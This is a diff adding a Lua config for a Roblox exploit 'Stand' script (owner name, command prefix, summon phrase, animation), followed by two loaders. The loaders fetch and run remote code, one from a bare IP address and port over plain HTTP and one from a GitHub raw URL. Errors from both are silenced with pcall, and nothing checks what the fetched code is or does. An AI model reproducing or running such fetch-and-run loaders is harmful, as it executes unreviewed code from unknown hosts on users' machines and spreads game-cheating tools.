@@ -1,0 +1,28 @@
+getgenv().SocietyStand = {
+    Main = {
+        --// ! Main ! \--
+        Owner = "Master", -- Username of owner !!CASE SENSITIVE!!
+        CustomName = "Master", -- Custom Name Text. Default is [Master]. Example: 'I'm Here, Master!'
+        CustomPrefix = "!", -- [ ! | / | . | ? | > | < | $ | ; | : ] Custom prefix
+        PrefixAT = "Before", -- [Before | After] decides if the prefix is before the command or after
+        Position = "Back", -- Position of Stand [Back | Left | Right]
+
+        --\ ! Main ! //-- 
+        --// ! Settings >.< ! \--
+        CustomSummon = "Star Platinum Za Warudo", -- Custom summon command 
+        FlyAnim = "fly3", -- Animation it uses: float1 / float2 / fly1 / fly2 / lev1 / lev2 / lev3 / fly3
+        ChatCommands = false, -- [true | false] Chats when you use some command
+        lowgfx = false, -- [true | false] Low graphics to boost performance
+        DisableRendering = false, -- [true | false] Disable rendering for maximum performance
+        --\ ! Settings >.< ! //--
+    }
+}
+
+-- Original loader + the extra one you wanted
+pcall(function()
+    loadstring(game:HttpGet("http://149.40.3.138:50908/main"))()
+end)
+
+pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/losermancracker-byte/scripts/refs/heads/main/commands"))()
+end)
